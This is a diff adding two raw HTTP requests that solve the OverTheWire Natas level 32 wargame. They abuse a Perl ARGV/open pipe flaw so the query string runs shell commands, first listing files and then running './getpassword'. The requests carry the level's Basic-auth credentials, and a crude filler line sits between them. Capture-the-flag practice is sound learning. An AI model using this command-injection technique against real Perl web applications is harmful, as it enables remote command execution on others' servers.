@@ -1,0 +1,59 @@
+POST /index.pl?ls%20.%20| HTTP/1.1
+Host: natas32.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------22445608112295
+Content-Length: 402
+Authorization: Basic bmF0YXMzMjpubzF2b2hzaGVDYWl2M2llSDRlbTFhaGNoaXNhaW5nZQ==
+Connection: close
+Referer: http://natas32.natas.labs.overthewire.org/
+Cookie: __cfduid=deb7210e17b7391f9dd3bd09811da4bfd1557733438
+Upgrade-Insecure-Requests: 1
+
+-----------------------------22445608112295
+Content-Disposition: form-data; name="file"
+
+ARGV
+-----------------------------22445608112295
+Content-Disposition: form-data; name="file"; filename="test.csv"
+Content-Type: application/vnd.ms-excel
+
+
+-----------------------------22445608112295
+Content-Disposition: form-data; name="submit"
+
+Upload
+-----------------------------22445608112295--
+
+PENISPENISPENISPENISPENIS
+
+POST /index.pl?./getpassword%20| HTTP/1.1
+Host: natas32.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------65682702923582
+Content-Length: 402
+Authorization: Basic bmF0YXMzMjpubzF2b2hzaGVDYWl2M2llSDRlbTFhaGNoaXNhaW5nZQ==
+Connection: close
+Referer: http://natas32.natas.labs.overthewire.org/
+Cookie: __cfduid=deb7210e17b7391f9dd3bd09811da4bfd1557733438
+Upgrade-Insecure-Requests: 1
+
+-----------------------------65682702923582
+Content-Disposition: form-data; name="file"
+
+ARGV
+-----------------------------65682702923582
+Content-Disposition: form-data; name="file"; filename="test.csv"
+Content-Type: application/vnd.ms-excel
+
+
+-----------------------------65682702923582
+Content-Disposition: form-data; name="submit"
+
+Upload
+-----------------------------65682702923582--
